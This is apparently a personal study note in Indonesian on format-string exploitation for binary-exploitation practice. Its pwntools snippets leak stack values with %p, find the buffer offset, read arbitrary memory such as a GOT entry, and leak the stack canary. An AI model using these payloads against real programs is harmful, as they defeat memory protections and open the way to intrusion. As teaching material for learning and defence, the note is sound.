#cybersecurity

Dengan format string, kita bisa **membaca memory di alamat mana pun** - ini cara utama me-leak libc, canary, atau PIE base tanpa bug tambahan.

## 1. Leak stack (dasar)

```python
# 10 pointer pertama dari stack/register
payload = b"%p." * 10
io.sendline(payload)
# 0x7ffc... 0x7f... 0x55... dst
```

Alamat yang terlihat:
- `0x7f...` → libc
- `0x7ffc...` → stack
- `0x55...` → binary (kalau PIE)

## 2. Leak dengan positional

```python
payload = b"%6$p"   # argumen ke-6
payload = b"%7$p.%8$p"
```

## 3. Cari posisi buffer

```python
# Taruh penanda di awal payload
payload = b"AAAA%p.%p.%p.%p.%p.%p.%p.%p.%p.%p"
io.sendline(payload)

# cari 0x41414141 di output -> itu posisi buffer kita
# misal muncul di %6$ -> posisi = 6
```

Sekarang kita tahu: `payload + %6$s` akan membaca memory di alamat yang kita taruh di 8 byte pertama payload.

## 4. Baca alamat tertentu (arbitrary read)

Untuk membaca alamat `0x7f...` (misal GOT puts):

```python
# payload: [alamat target (8 byte)] + %posisi$s
addr = elf.got.puts
payload = p64(addr) + b"%6$s"   # 6 = posisi buffer

io.sendline(payload)
leak = io.recvline()
# isi memory di addr (alamat puts di libc) tercetak sebagai string
```

Catatan: `%s` berhenti di null byte - untuk alamat penuh kadang perlu `%6$s` berulang dengan alamat berbeda-beda, atau leak 6 byte lalu `u64(leak.ljust(8, b"\x00"))`.

## 5. Leak canary

Canary ada di stack sebelum return address. Leak dengan `%p`:

```python
# temukan posisi yang menampilkan nilai berakhiran 00 (canary 64-bit)
# bisa dengan mengirim banyak %p lalu cari nilai dengan byte pertama \x00
payload = b"%p." * 30
out = io.recvline().decode().split(".")
for i, v in enumerate(out):
    val = int(v, 16)
    if val & 0xFF == 0:      # byte pertama null = canary
        print(f"canary di posisi {i}: {hex(val)}")
```

## 6. Leak dengan format otomatis (fmtstr)

pwntools punya helper untuk leak:

```python
from pwn import *
# FmtStr otomatis menemukan posisi offset
# lalu bisa leak dengan fmtstr_payload (untuk write)
```

## Ringkasan

```
%p        -> leak nilai stack/register
%N$p      -> leak argumen posisi N
[p64(addr)] + %N$s  -> baca memory di addr
```

## Tips

1. Alamat dalam payload harus `p64` (little endian) - lihat [[Little Endian dan Format Data]].
2. Kalau output terpotong null byte, leak byte-by-byte atau cari cara lain.
3. Leak libc → hitung base ([[Ret2libc]]); leak canary → bypass canary ([[Stack Canary]]).
4. `%s` di alamat tidak valid = crash - mulai dari `%p` dulu.
